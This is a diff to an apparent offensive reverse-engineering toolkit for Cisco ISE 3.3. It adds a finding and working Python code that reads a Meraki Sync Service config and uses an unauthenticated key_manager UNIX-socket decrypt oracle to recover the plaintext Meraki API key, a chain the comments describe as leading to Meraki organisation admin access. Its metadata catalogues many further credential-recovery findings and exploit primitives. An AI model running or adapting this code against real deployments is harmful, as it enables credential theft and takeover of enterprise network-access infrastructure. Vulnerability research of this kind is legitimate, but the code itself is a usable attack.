@@ -54,6 +54,7 @@ ISE-F35: AES-128 KEK stored in plaintext in db.properties alongside KEK-encrypte
 ISE-F36: CTA adapter hardcoded AES-CBC IV ISE_AES_TCNAC_VA + PBKDF2 from MongoDB UUIDs — decrypt TCNAC credentials [HIGH]
 ISE-F37: Redis profiler database on localhost:6379 — no requirepass, no TLS; stores ISE endpoint/profiler data [MEDIUM]
 ISE-F38: resetSystemPasswds() bug — orapwd password=dbstr (missing $) sets Oracle SYS to literal "dbstr" on wallet failure [HIGH]
+ISE-F39: mctrust (Meraki Sync Service) container mounts -v /var/run/:/host/var/run/ with --cap-drop=all — key_manager.sock accessible from bridge-isolated container; Meraki API key recoverable via ISE-F1 chain [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3158,9 +3159,85 @@ def check_oracle_wallet_failure_password(host: str = "localhost",
         return None
 
 
+# ISE-F39: mctrust (Meraki Sync Service) container — key_manager.sock accessible from within container
+# Source: /opt/CSCOcpm/bin/mctrust-control.sh (lines 189-199)
+# Container run flags: --cap-drop=all -v /var/run/:/host/var/run/ --network mctrust-network (bridge 169.254.8.0/24)
+# Binary strings: json:"apiKey" in merakiConfig struct; X-Idempotency-Key (Meraki API header)
+# Binary refs: getMerakiACLs, getMerakiGroups, getMerakiPolicies, getMerakiOrg
+# Config file: /opt/mctrust/config.yaml (bind-mounted R/W from host at MCTRUST_HOME:/opt/mctrust)
+# Attack: compromise mctrust container -> connect to /host/var/run/key_manager.sock (world-writable per ISE-F13)
+#         -> use ISE-F1 decrypt oracle -> recover Meraki API key -> Meraki dashboard admin access
+
+MCTRUST_CONFIG_PATH = "/opt/mctrust/config.yaml"
+MCTRUST_KEY_MANAGER_SOCKET_IN_CONTAINER = "/host/var/run/key_manager.sock"
+
+
+def read_mctrust_config(path: str = MCTRUST_CONFIG_PATH) -> dict:
+    """ISE-F39: Read mctrust config.yaml from host filesystem to find encrypted Meraki API key blob."""
+    import yaml
+    try:
+        with open(path, "r") as f:
+            return yaml.safe_load(f)
+    except Exception:
+        return {}
+
+
+def extract_meraki_api_key_via_decrypt_oracle(
+    config_path: str = MCTRUST_CONFIG_PATH,
+    km_socket: str = "/var/run/key_manager.sock",
+) -> dict:
+    """ISE-F39: Read mctrust config for encrypted Meraki API key; decrypt via key_manager (ISE-F1).
+
+    Exploitation chain:
+      ISE-F13 (world-writable key_manager.sock) -> ISE-F1 (decrypt oracle)
+      -> plaintext Meraki API key -> dashboard.meraki.com org admin
+
+    From within mctrust container: use km_socket = MCTRUST_KEY_MANAGER_SOCKET_IN_CONTAINER.
+    From host: use km_socket = /var/run/key_manager.sock.
+    """
+    import json
+    import socket as _socket
+
+    config = read_mctrust_config(config_path)
+    meraki_cfg = config.get("meraki") or config.get("merakiConfig") or {}
+    api_key_blob = meraki_cfg.get("apiKey") or meraki_cfg.get("api_key") or ""
+
+    if not api_key_blob:
+        return {"error": "no apiKey blob in config", "config_keys": list(config.keys())}
+
+    # If apiKey looks like a base64 ciphertext (not a plaintext key), decrypt via ISE-F1
+    import base64
+    try:
+        base64.b64decode(api_key_blob)
+        is_ciphertext = len(api_key_blob) > 40 and "=" in api_key_blob[-4:]
+    except Exception:
+        is_ciphertext = False
+
+    if is_ciphertext:
+        payload = json.dumps({
+            "msg_type": "POST", "version": 1,
+            "msg": {"action": "decrypt", "params": {"data": api_key_blob}}
+        })
+        with _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM) as s:
+            s.connect(km_socket)
+            s.sendall(payload.encode())
+            resp = b""
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+        result = json.loads(resp.decode())
+        plaintext = result.get("data") or result.get("result", {}).get("data", "")
+        return {"meraki_api_key_ct": api_key_blob, "meraki_api_key_pt": plaintext}
+    else:
+        # apiKey stored as plaintext in config.yaml (no application-layer encryption)
+        return {"meraki_api_key_pt": api_key_blob, "encrypted": False}
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.17.0",
+    "version": "1.18.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3170,11 +3247,13 @@ MODULE_META = {
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
         "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
+        "ISE-F39",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
-             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38"],
+             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
+             "ISE-F39"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33", "ISE-F37"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
@@ -3234,6 +3313,16 @@ MODULE_META = {
         "ise_f38_trigger": "resetSystemPasswds() when system10 wallet connection fails",
         "ise_f38_script": "/opt/CSCOcpm/bin/cpmcontrol.sh:322",
         "ise_f38_bug": "orapwd password=dbstr (missing $) instead of password=$dbstr",
+        "ise_f38_audit_trail": "NONE (audit_trail='NONE' in initcpm10.ora — no forensic record of SYS SYSDBA login)",
+        "ise_f39_container": "mctrust (McTrust — Meraki Sync Service)",
+        "ise_f39_control_script": "/opt/CSCOcpm/bin/mctrust-control.sh",
+        "ise_f39_run_flags": "--cap-drop=all -v /var/run/:/host/var/run/ --network mctrust-network",
+        "ise_f39_socket_in_container": "/host/var/run/key_manager.sock",
+        "ise_f39_config_on_host": "/opt/mctrust/config.yaml",
+        "ise_f39_meraki_struct_tag": "json:\"apiKey\" in main.merakiConfig",
+        "ise_f39_meraki_api_header": "X-Idempotency-Key (Meraki dashboard.meraki.com API)",
+        "ise_f39_chain": "mctrust-RCE -> /host/var/run/key_manager.sock -> ISE-F1 decrypt -> Meraki API key -> Meraki org admin",
+        "ise_f39_isolation_bypass": "bridge-network + --cap-drop=all provides false isolation; UNIX socket mount breaks it",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3292,5 +3381,7 @@ MODULE_META = {
         "probe_redis_profiler",
         "dump_redis_profiler_keys",
         "check_oracle_wallet_failure_password",
+        "read_mctrust_config",
+        "extract_meraki_api_key_via_decrypt_oracle",
     ],
 }
